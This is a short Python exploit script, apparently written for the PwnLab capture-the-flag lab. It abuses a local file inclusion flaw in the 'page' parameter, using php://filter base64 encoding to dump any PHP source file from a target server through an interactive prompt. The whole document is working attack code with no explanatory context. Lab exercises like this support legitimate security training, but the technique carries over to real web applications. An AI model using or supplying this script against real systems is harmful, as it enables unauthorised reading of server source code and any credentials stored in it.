#!/usr/bin/python3

import requests
import base64
import re

def getPhpCode(ip,filename):
    r = requests.get('http://'+ip+'/?page=php://filter/convert.base64-encode/resource=' + filename);
    # looking for a base64 string
    result = re.search('PD9(.*?)</center>',r.text).group(1)
    b64 = "PD9"+result+"=="
    return base64.b64decode(b64)


if __name__ == '__main__':

    print('''
                      _       _     _     _____ ___               
  _ ____      ___ __ | | __ _| |__ | |   |  ___|_ _|  _ __  _   _ 
 | '_ \ \ /\ / / '_ \| |/ _` | '_ \| |   | |_   | |  | '_ \| | | |
 | |_) \ V  V /| | | | | (_| | |_) | |___|  _|  | | _| |_) | |_| |
 | .__/ \_/\_/ |_| |_|_|\__,_|_.__/|_____|_|   |___(_) .__/ \__, |
 |_|                                                 |_|    |___/ 
                                                          
                                                          @manulqwerty
''')


    ip=input('[+] Enter the ip of the PwnLab: ')
    while True:
        cmd = input('> ')
        if cmd == 'exit':
            break
        try:
            output = getPhpCode(ip,cmd)
            print(output.decode('unicode_escape'))
        except:
	        print('ERROR')
